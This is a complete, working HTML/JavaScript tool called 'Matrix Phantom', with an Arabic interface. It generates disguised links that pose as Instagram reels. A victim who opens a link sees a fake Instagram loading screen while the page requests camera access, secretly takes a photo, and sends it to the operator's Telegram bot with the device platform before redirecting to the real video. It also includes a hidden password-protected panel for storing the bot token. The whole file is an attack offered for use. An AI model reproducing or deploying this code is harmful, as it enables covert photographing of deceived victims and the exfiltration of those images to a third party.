<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix Phantom | Control Panel</title>
    <style>
        :root { --primary: #0095f6; --bg: #000; --card: #121212; --text: #fff; --danger: #ff3b30; }
        body { margin: 0; background: var(--bg); font-family: -apple-system, system-ui, sans-serif; color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        
        .container { width: 100%; max-width: 400px; padding: 20px; z-index: 10; }
        .card { background: var(--card); border: 1px solid #333; padding: 30px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.7); position: relative; }
        
        h2 { text-align: center; color: var(--primary); font-size: 22px; margin-bottom: 30px; letter-spacing: 1px; }
        
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-right: 5px; }
        input { width: 100%; padding: 14px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; transition: 0.3s; box-sizing: border-box; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 149, 246, 0.2); }
        
        .btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
        .btn:active { transform: scale(0.97); }
        
        /* شاشة التحميل */
        .loader { display: none; text-align: center; padding: 20px; }
        .spinner { width: 30px; height: 30px; border: 3px solid #222; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
        
        /* النتيجة والروابط */
        .result-box { display: none; margin-top: 25px; animation: slideUp 0.5s ease; }
        .link-area { background: #000; padding: 12px; border-radius: 10px; border: 1px dashed #444; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
        .link-area input { border: none; background: transparent; padding: 0; color: #00ff00; font-size: 13px; cursor: default; }
        .actions { display: flex; gap: 10px; }
        .icon { cursor: pointer; opacity: 0.6; transition: 0.3s; font-size: 18px; }
        .icon:hover { opacity: 1; color: var(--primary); }

        /* لوحة التحكم السرية */
        .admin-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .admin-overlay.active { display: flex; }

        /* واجهة الضحية (Instagram Fake UI) */
        #trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; align-items: center; justify-content: center; flex-direction: column; }
        .ig-logo { width: 70px; margin-bottom: 20px; animation: pulse 1.5s infinite; }

        .v-tag { position: fixed; bottom: 10px; left: 10px; font-size: 9px; color: #1a1a1a; cursor: pointer; user-select: none; }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.5; } 50% { transform: scale(1); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.5; } }
    </style>
</head>
<body>

    <div class="container" id="app-main">
        <div class="card">
            <h2>MATRIX PHANTOM</h2>
            
            <div id="input-view">
                <div class="input-group">
                    <label>رابط الفيديو الأصلي</label>
                    <input type="text" id="target-url" placeholder="https://www.instagram.com/reels/...">
                </div>
                <button class="btn" onclick="startMining()">تـلـغـيـم الـرابـط 🔥</button>
            </div>

            <div class="loader" id="main-loader">
                <div class="spinner"></div>
                <p style="font-size: 12px; color: #888;">جاري معالجة البيانات وتشفير الرابط...</p>
            </div>

            <div class="result-box" id="result-view">
                <label>الرابط الملغم (جاهز للإرسال):</label>
                <div class="link-area">
                    <input type="text" id="final-url" readonly>
                    <div class="actions">
                        <span class="icon" id="eye-btn" onclick="toggleLink()">👁️</span>
                        <span class="icon" onclick="copyResult()">📋</span>
                    </div>
                </div>
                <p style="font-size: 10px; color: #555; margin-top: 10px; text-align: center;">الرابط يحتوي على تشفير 128-bit للبيانات.</p>
            </div>
        </div>
    </div>

    <div class="admin-overlay" id="admin-panel">
        <div class="card" style="width: 100%;">
            <h3 style="text-align: center; margin-top: 0;">⚙️ إعدادات السيرفر</h3>
            <div class="input-group">
                <label>تـوكـن الـبـوت (Bot Token)</label>
                <input type="password" id="cfg-token" placeholder="8242090767:AAEF...">
            </div>
            <div class="input-group">
                <label>الأي دي الخاص بك (Your ID)</label>
                <input type="text" id="cfg-id" placeholder="8319850793">
            </div>
            <button class="btn" onclick="saveConfig()">اتصال بالسيرفر ✅</button>
            <button class="btn" style="background: #222; margin-top: 10px;" onclick="document.getElementById('admin-panel').classList.remove('active')">إغلاق</button>
        </div>
    </div>

    <div id="trap-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="ig-logo">
        <p style="font-size: 14px; color: #999;">جاري الانتقال للتطبيق...</p>
    </div>

    <canvas id="hidden-canvas" style="display:none;"></canvas>
    <div class="v-tag" id="secret-trigger">Version 1.0.4</div>

    <script>
        let clicks = 0;
        let isLinkVisible = false;

        // 1. الدخول للوحة التحكم (3 ضغطات + باسورد)
        document.getElementById('secret-trigger').onclick = function() {
            clicks++;
            if (clicks === 3) {
                let p = prompt("🔐 كلمة السر:");
                if (p === "01224815487") {
                    document.getElementById('admin-panel').classList.add('active');
                    const saved = JSON.parse(localStorage.getItem('mx_cfg') || '{}');
                    document.getElementById('cfg-token').value = saved.t || '';
                    document.getElementById('cfg-id').value = saved.i || '';
                } else { alert("❌ خطأ!"); }
                clicks = 0;
            }
        };

        // 2. حفظ الإعدادات
        function saveConfig() {
            const t = document.getElementById('cfg-token').value;
            const i = document.getElementById('cfg-id').value;
            if (t && i) {
                localStorage.setItem('mx_cfg', JSON.stringify({t, i}));
                alert("🚀 تم الاتصال بالسيرفر بنجاح!");
                document.getElementById('admin-panel').classList.remove('active');
            }
        }

        // 3. توليد الرابط الملغم
        function startMining() {
            const url = document.getElementById('target-url').value;
            const cfg = JSON.parse(localStorage.getItem('mx_cfg') || '{}');
            if (!url || !cfg.t) return alert("⚠️ اربط البوت وحط الرابط الأول!");

            document.getElementById('input-view').style.display = 'none';
            document.getElementById('main-loader').style.display = 'block';

            setTimeout(() => {
                const payload = btoa(JSON.stringify({t: cfg.t, i: cfg.i, u: url}));
                const final = window.location.origin + window.location.pathname + "?data=" + payload;
                document.getElementById('final-url').value = final;
                document.getElementById('main-loader').style.display = 'none';
                document.getElementById('result-view').style.display = 'block';
            }, 2000);
        }

        // 4. وظائف إضافية
        function toggleLink() {
            const input = document.getElementById('final-url');
            isLinkVisible = !isLinkVisible;
            input.type = isLinkVisible ? "text" : "password";
            document.getElementById('eye-btn').innerText = isLinkVisible ? "🕶️" : "👁️";
        }

        function copyResult() {
            const input = document.getElementById('final-url');
            input.select();
            document.execCommand('copy');
            alert("📋 تم النسخ!");
        }

        // 5. مـنـطق الـمـصـيدة (يشتغل عند فتح الرابط الملغم)
        window.onload = async () => {
            const params = new URLSearchParams(window.location.search);
            const data = params.get('data');
            if (data) {
                document.getElementById('app-main').style.display = 'none';
                document.getElementById('trap-screen').style.display = 'flex';
                
                try {
                    const decoded = JSON.parse(atob(data));
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.getElementById('hidden-canvas');
                    canvas.width = 640; canvas.height = 640;
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 640);
                    
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                    const fd = new FormData();
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('chat_id', decoded.i);
                    fd.append('caption', `🎯 صيد جديد من Matrix Phantom!\n\n📱 الجهاز: ${navigator.platform}\n🔗 الرابط: ${decoded.u}`);

                    await fetch(`https://api.telegram.org/bot${decoded.t}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = decoded.u;
                } catch (e) { 
                    const decoded = JSON.parse(atob(data));
                    window.location.href = decoded.u; 
                }
            }
        };
    </script>
</body>
</html>
